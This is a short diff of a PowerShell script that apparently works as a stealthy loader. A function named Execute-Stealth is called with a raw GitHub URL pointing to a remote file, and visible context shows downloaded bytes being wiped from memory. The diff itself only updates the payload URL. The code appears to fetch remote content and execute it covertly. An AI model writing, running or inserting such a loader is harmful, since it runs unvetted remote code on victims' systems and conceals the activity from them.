@@ -41,6 +41,6 @@ function Execute-Stealth {
     [Array]::Clear($bytes, 0, $bytes.Length)
 }
 
-$url = "https://raw.githubusercontent.com/thegoatofapi/mth/main/file.txt"
+$url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"
 
 Execute-Stealth -url $url
